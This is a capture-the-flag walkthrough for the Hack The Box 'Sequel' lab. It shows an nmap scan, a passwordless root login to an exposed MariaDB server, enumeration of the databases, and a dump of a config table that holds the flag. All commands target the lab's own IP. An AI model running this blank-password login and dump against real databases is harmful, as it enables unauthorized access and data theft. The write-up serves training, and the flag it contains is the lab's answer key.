
# HTB Machine: Sequel

* **OS:** Linux
* **Difficulty:** Very Easy (Tier 0)
* **Date Started:** July 2026
* **Target IP:** `10.129.95.232`

---

## Step-by-Step Walkthrough

### Step 1: Reconnaissance & Scanning
Run an initial `nmap` scan to discover open ports and determine the versions of running services:

```bash
sudo nmap -sV -sC 10.129.95.232
```

**Key Findings:**
* **Port 3306 (MySQL/MariaDB):** Open and active database service.

---

### Step 2: Database Exploitation (Blank Password Bypass)
Attempt a remote connection to the MariaDB/MySQL service using the administrative `root` user. The database allows a passwordless login, granting immediate access without credentials:

```bash
mysql -u root -p -h 10.129.95.232 -P 3306
# When prompted for a password, press Enter.
```

---

### Step 3: Database Enumeration & Flag Retrieval
Once authenticated to the MariaDB monitor, list the available databases to find the target data:

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+

| Database           |
+--------------------+

| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

Select the `htb` database and view its tables to locate system configurations:

```sql
MariaDB [(none)]> USE htb;
Database changed

MariaDB [htb]> SHOW TABLES;
+---------------+

| Tables_in_htb |
+---------------+

| config        |
| users         |
+---------------+
```

Query all contents from the `config` table to exfiltrate the stored configuration values and recover the flag:

```sql
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+

| id | name                  | value                            |
+----+-----------------------+----------------------------------+

|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

* **Recovered Flag:** `7b4bec00d1a39e3dd4e021ec3d915da8`
